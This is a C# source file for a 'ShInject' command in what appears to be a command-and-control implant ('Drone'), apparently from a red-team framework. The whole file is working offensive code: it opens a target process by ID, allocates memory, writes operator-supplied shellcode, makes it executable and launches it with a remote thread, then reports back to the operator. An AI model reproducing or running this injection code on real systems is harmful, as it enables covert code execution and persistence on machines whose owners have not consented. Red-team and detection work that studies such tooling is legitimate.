using System;
using System.Threading;

using DInvoke.Data;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public class ShInject : DroneCommand
{
    public override byte Command => 0x4A;
    public override bool Threaded => false;
    
    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // parse target pid
        var pid = uint.Parse(task.Arguments[0]);
        
        // open handle to target process
        var hProcess = IntPtr.Zero;
        var status = NtOpenProcess(pid, (uint)(PROCESS_ACCESS_FLAGS.PROCESS_VM_READ
                                               | PROCESS_ACCESS_FLAGS.PROCESS_VM_WRITE |
                                               PROCESS_ACCESS_FLAGS.PROCESS_VM_OPERATION |
                                               PROCESS_ACCESS_FLAGS.PROCESS_CREATE_THREAD |
                                               PROCESS_ACCESS_FLAGS.PROCESS_TERMINATE),
            ref hProcess);

        if (status != Native.NTSTATUS.Success)
        {
            Drone.SendTaskError(task.Id, status.ToString());
            return;
        }

        // allocate memory in process
        var baseAddress = IntPtr.Zero;
        status = NtAllocateVirtualMemory(hProcess, task.Artefact.Length, MEMORY_PROTECTION.PAGE_READWRITE, ref baseAddress);

        if (status != Native.NTSTATUS.Success)
        {
            Drone.SendTaskError(task.Id, status.ToString());
            CloseHandle(hProcess);
            return;
        }

        // write shellcode into process
        status = NtWriteVirtualMemory(hProcess, baseAddress, task.Artefact);
        
        if (status != Native.NTSTATUS.Success)
        {
            Drone.SendTaskError(task.Id, status.ToString());
            CloseHandle(hProcess);
            return;
        }

        // flip memory protection
        status = NtProtectVirtualMemory(hProcess, baseAddress, task.Artefact.Length,
            MEMORY_PROTECTION.PAGE_EXECUTE_READ, out _);
        
        if (status != Native.NTSTATUS.Success)
        {
            Drone.SendTaskError(task.Id, status.ToString());
            CloseHandle(hProcess);
            return;
        }

        // create thread
        var hThread = IntPtr.Zero;
        status = NtCreateThreadEx(hProcess, baseAddress, ref hThread);

        if (status != Native.NTSTATUS.Success)
        {
            Drone.SendTaskError(task.Id, status.ToString());
            CloseHandle(hProcess);
            return;
        }
        
        // close handle
        CloseHandle(hProcess);
        CloseHandle(hThread);
        
        Drone.SendTaskComplete(task.Id);
    }
}